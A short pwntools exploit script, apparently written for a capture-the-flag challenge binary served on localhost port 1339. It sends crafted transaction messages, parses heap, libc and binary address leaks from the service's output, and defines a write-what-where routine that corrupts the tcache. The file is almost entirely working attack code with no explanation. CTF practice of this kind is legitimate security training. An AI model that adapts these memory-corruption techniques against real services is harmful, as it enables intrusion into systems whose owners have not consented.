from pwn import *
from time import sleep
context.log_console = "DEBUG"

#p=process("./chall2")
p = remote("127.0.0.1",1339)
def send_tx(i,o,a,f,v):
    return b"st"+p64(i)+p64(o)+p32(a)+p32(f)+p8(v)
def view_tx(h):
    return b"vt"+p16(h)

init_tx = send_tx(1, 1, 1, 1, 1)

def www(what, where):
    #tx_0 = init_tx # activation tx
    tx_1 = send_tx(where, 0x9001, 0x4000, 100, 1) # clean tx
    tx_2 = send_tx(where, 0x9001, 0x8844, 0, 1) # overwrite block for tcache add & tcache trigger
    tx_3 = send_tx(2, 2, 2, 1, 1) # putting target into bin
    tx_4 = send_tx(what, 0x33, 0x23, 1, 3) # triggering the location write

    p.send(init_tx)
    sleep(1)
    p.send(tx_1)
    sleep(1)
    p.send(tx_2)
    sleep(0.5)
    p.send(tx_3)
    sleep(0.5)
    p.send(tx_4)


p.send(init_tx)
sleep(0.5)
p.send(view_tx(0))
leak=(p.recv().decode())

print(leak)
hleak = int(leak.split("tx input =")[1].split("\n")[0])
lleak = int(leak.split("tx output =")[1].split("\n")[0])
bleak1 = int(leak.split("tx amount =")[1].split("\n")[0])
bleak2 = int(leak.split("tx fee    =")[1].split("\n")[0])
#www(0x1337, 0x1337)
bleak = hex(bleak2) + hex(bleak1).replace("0x", "")

print(hex(hleak), hex(lleak), hex(int(bleak, 16)))

#gdb.attach(p)

p.interactive()
